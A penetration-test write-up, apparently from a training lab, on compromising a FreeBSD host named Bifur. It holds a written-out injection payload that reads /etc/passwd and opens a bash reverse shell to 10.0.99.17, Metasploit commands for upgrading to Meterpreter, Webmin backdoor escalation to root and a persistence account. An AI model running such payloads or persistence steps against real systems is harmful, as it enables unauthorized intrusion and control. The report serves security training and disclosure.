# Bifur

**DISCLAIMER**

This report is intended only for the use of the individual or entity to which it is addressed and may contain information that is privileged, confidential, and exempt from disclosure under applicable law. If the reader of this disclaimer is not the indented recipient, you are hereby notified that any dissemination, distribution, or copying of this document is strictly prohibited. If you receive this document in error, please notify the creator immediately by telephone and return the original document to the owner.

## Executive Summary

This report documents the findings of a penetration test carried out by Noah Beckman against the target Bifur. The project was completed in September 2022 and revealed the existence of two security-relevant issues. The completion of the assessment took a total of three days.&#x20;

The main target in scope was a computer running FreeBSD. Methodology wise the assessment followed a black-box approach, meaning there was no access to the source code or file system. The Cyber.local team provided the environment and reset capabilities.

The aforementioned comprimises involve two actual security vulnerabilities and multiple general weaknesses. The majority of these discoveries received a high severity ranking as root level compromise was possible as well as local file exploitation potentially disclosing PII information.&#x20;

## Introduction

The aim of this Pentest is to assess the security of a clients endpoint Bifur. This report contains technical terms, but has been written so a non-technical reader with basic computing knowledge would understand it. Technical context will be provided in the appendices and screenshots. Should the reader encounter difficulties understanding any section of the report, reading the "Executive Summary" and the "Conclusions and Recommendations" section. For further help, contact the help department.&#x20;

### Some Definitions

**Hacker**: term given by the public that the cyber security industry more accurately call and attacker or intruder.

**Vulnerability:** Typically a bug or a misconfiguration in a computer program, or computer that can be abused to gain access on a computer

**Exploit:** A program or strategy to exploit a vulnerability.&#x20;

**Privilege Escalation:** A technique to escalate privileges on a computer, often to an admin user.

**Metasploit/Meterpreter:** A tool that was designed to execute various vulnerabilities automatically. Helpful for Penetration Testing

{% embed url="https://pentestreports.com/reports/BitesPenTesting/penetration-test-report.html" %}

## Hostname

| IP Addresses | Network         |
| ------------ | --------------- |
| 10.0.5.24    | Bifur.shire.org |



### Target Overview

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption><p>NsLookup of Domain</p></figcaption></figure>

### Vulnerabilities&#x20;

> #### Local File Inclusion

*   Severity (High Threat Directory Traversal)

    > This vulnerability allows for remote commands to be executed. /etc/passwd can be viewed as well as other commands can be run. This exploit allows for a reverse shell to be established.
*   Mitigation

    > The web form needs to validate inputs and maintain a whitelist of acceptable filenames. In addition, a corresponding identifier (not the actual name) to access the file should be used. Any request containing an invalid identifier can then simply be rejected. This is the [approach that OWASP recommends](https://www.owasp.org/index.php/Testing\_for\_Remote\_File\_Inclusion). Refer to the source below for more information on mitigation.

{% embed url="https://www.pivotpointsecurity.com/blog/file-inclusion-vulnerabilities/" %}
Source
{% endembed %}

> #### Webmin Password\_Change.cgi Backdoor ([CVE-2019-15107](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107))

*   Severity (9.8 Critical)

    > This is a critical vulnerability. The attacker can gain root access due to misconfigured Webmin and privlege escalation.
*   Mitigation

    > Update to Version 2.0 This came out a few days ago. If this does not mitigate the CVE, a manually hard coded patch may have to be applied

## Supporting Evidence

### Scanning and Enumeration

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>nmap of IP to determine services</p></figcaption></figure>

The Nmap scan shows the service scan of the target IP. Two services can be seen to be open: SSH and Nginx. This lets us know that there is probably an active web page.

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption><p>live webpage</p></figcaption></figure>

This is the live webpage active on the target. To enumerate further I inspected the webpage code using the network page and raw inspector. This showed me that there is a function being passed when the log files view file button is pressed. This can be seen in a screenshot below.

#### Vulnerability Detection

This section will detail how the initial vulnerability was found and exploited.

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p>Burpsuite output of view log page.</p></figcaption></figure>

Burp suite gives an editable output of what the page is sending to the web server. This allows for the manual manipulation of the file that is viewed by changing the logfiles path.

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption><p>View log button</p></figcaption></figure>

#### Foothold

```bash
/etc/passwd;bash -c 'bash -i >& /dev/tcp/10.0.99.17/5555 0>&1'
```

The command above is the command to cat the /etc/passwd file of the target machine and start a reverse shell.

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>Attack in Burpsuite</p></figcaption></figure>

Because the attack is going through the web server, the attack needs to be URL encoded. If not the attack will fail and error out.

#### Turning Reverse Shell into Meterpreter shell

<details>

<summary>Quick Commands</summary>

#### Reverse TCP Shell

```
use exploit/multi/handler
set Lport <custom port not being used ex. 5557>
se LHOST <host kali/vm ip>
exploit
```

#### Elevating the shell to Meterpreter

```
use post/multi/manage/shell_to_meterpreter
show options
sessions -i
set <session number with reverse shell>
set lport <not being used port ex. 5559>
exploit
```

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption><p>Creating Reverse Shell in metasploit</p></figcaption></figure>

This shows how to gain an active reverse shell to the target from Metasploit

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption><p>elevating the shell to a meterpreter shell</p></figcaption></figure>

We want to elevate the reverse shell to a Meterpreter session so we can execute our privilege Escalation.

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption><p>Settings for the elevated session</p></figcaption></figure>

This shows the options of how to elevate the reverse shell to Meterpreter session

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption><p>How to list sessions</p></figcaption></figure>

Using the command _sessions -i_ we can list the current active sessions

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>elevation setting options</p></figcaption></figure>

This screenshot shows the settings set so you can elevate the connection

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption><p>Active sessions after elevation</p></figcaption></figure>

You can see the elevated session was created with ID 3.&#x20;

#### Privilege Escalation

Privilege escalation typically starts out with searching through currently running services, SUID bits, and more. The program Linpeas.sh is typically another good start that automatically runs through most of the checks. Often times this gives us the best place to look not an actual vulnerability. After running Linpeas on this target, webmin shows up a lot as a service. This hinted to me that I should look for vulnerabilities on it.

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption><p>Searching for vulnerabilities on the webmin service</p></figcaption></figure>

Even though I know there are vulnerabilities, I need to determine what version is currently being run. I eventually found the version number below.

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption><p>Webmin version number</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Creating a Proxy in Metasploit</p></figcaption></figure>

Webmin is a http service that runs locally. In order for this specific exploit to work, you need to setup a reverse proxy. The picture above is how that is setup.

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>Backdoor Settings</p></figcaption></figure>

The top box is the format for how to set the proxy in the exploit. This is critical as the exploit wont work without it. The middle box shows the configured proxy and rhost. Same thing for the Lhost on the bottom box. SSL has to be on / set to True

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption><p>Flags to force the exploit to work</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39) (1).png" alt=""><figcaption><p>Screenshot of the exploit running</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (2).png" alt=""><figcaption><p>Screenshot of Root Flag</p></figcaption></figure>

This screenshot shows the root flag as proof of root compromise.

#### Persistence

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>User Creation </p></figcaption></figure>

This screenshot shows the creation of my own user. This allows me to directly SSH to the target.

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption><p>mod the created user</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p>my user passwd</p></figcaption></figure>

Persistance Account PW: Youcantguessmypassword1a

**Post Exploitation (Loot)**

{% embed url="https://app.gitbook.com/s/ARbxojkXZUSOB608QVbo/tools-and-loot/loot" %}
Loot Page
{% endembed %}

### Conclusions and Recommendations

In conclusion, the assessment identified that properly configured web application that validated inputs and checked a corresponding identifier, per the OWASP top ten recommendations, increased the difficulty to exploit local file inclusion vulnerabilities.&#x20;

### **Lab Issues**

#### Metasploit Issues

If your metasploit wont run you can run this to potentially fix it.

```bash
sudo apt-get upgrade metasploit-framework
```
